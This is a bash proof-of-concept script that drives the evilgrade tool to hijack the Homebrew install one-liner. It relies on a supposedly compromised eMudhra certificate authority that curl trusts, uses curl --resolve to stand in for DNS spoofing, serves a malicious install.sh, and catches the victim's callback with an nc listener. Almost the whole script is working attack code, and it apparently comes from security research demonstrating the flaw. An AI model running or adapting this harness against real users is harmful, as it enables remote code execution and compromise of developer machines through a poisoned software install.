#!/bin/bash
###############################################################################
# run_brew.sh - Homebrew install one-liner MITM, served by REAL evilgrade,
#               via the compromised eMudhra CA that /usr/bin/curl trusts.
#
# Drives evilgrade's own webserver (serve.pl) with the homebrew_update module,
# then runs the genuine Homebrew install one-liner as the victim. DNS spoof is
# modeled with curl --resolve; in a real engagement evilgrade's DNS server (or
# ARP/rogue DHCP) points raw.githubusercontent.com at the attacker.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
PORT=9443; LHOST=127.0.0.1; LPORT=4444
HOSTS="raw.githubusercontent.com:$PORT:127.0.0.1"
URL="https://raw.githubusercontent.com:$PORT/Homebrew/install/HEAD/install.sh"

# pick a free SSL port (Docker etc. may squat common ones)
for p in 9443 9543 12443 18443; do lsof -nP -iTCP:$p -sTCP:LISTEN >/dev/null 2>&1 || { PORT=$p; break; }; done
HOSTS="raw.githubusercontent.com:$PORT:127.0.0.1"
URL="https://raw.githubusercontent.com:$PORT/Homebrew/install/HEAD/install.sh"

rm -f /tmp/OWNED_BY_BREW /tmp/brew_cb.log
( nc -l "$LPORT" > /tmp/brew_cb.log 2>&1 ) & NCPID=$!
echo "== starting REAL evilgrade webserver (homebrew_update, eMudhra cert) on :$PORT =="
/usr/bin/perl demo/emudhra_mitm/serve.pl "$PORT" "homebrew_update:$LHOST:$LPORT" > /tmp/eg_brew.log 2>&1 &
EGPID=$!
sleep 4
lsof -nP -iTCP:$PORT -sTCP:LISTEN >/dev/null 2>&1 && echo "   evilgrade listening on :$PORT" || { echo "   FAILED to bind"; grep -iE 'agent|error|did not' /tmp/eg_brew.log|tail; kill $EGPID $NCPID 2>/dev/null; exit 1; }

echo
echo "== VICTIM: genuine Homebrew install one-liner (DNS spoofed -> evilgrade) =="
echo "   \$ /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
/bin/bash -c "$(/usr/bin/curl -fsSL --resolve "$HOSTS" "$URL")" 2>&1 | sed 's/^/   /'
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_BREW =="; [ -f /tmp/OWNED_BY_BREW ] && sed 's/^/   /' /tmp/OWNED_BY_BREW || echo "   <not created>"
echo "== PROOF: attacker callback on $LHOST:$LPORT =="; [ -s /tmp/brew_cb.log ] && sed 's/^/   /' /tmp/brew_cb.log || echo "   <none>"
echo
echo "== CONTROL: Apple Secure Transport backend rejects the eMudhra cert =="
printf "   secure-transport: "; CURL_SSL_BACKEND=secure-transport /usr/bin/curl -s --resolve "$HOSTS" "$URL" -o /dev/null 2>/dev/null && echo "accepted (unexpected)" || echo "REJECTED (curl 60)"

kill "$EGPID" "$NCPID" >/dev/null 2>&1; wait 2>/dev/null
echo; echo "== done =="
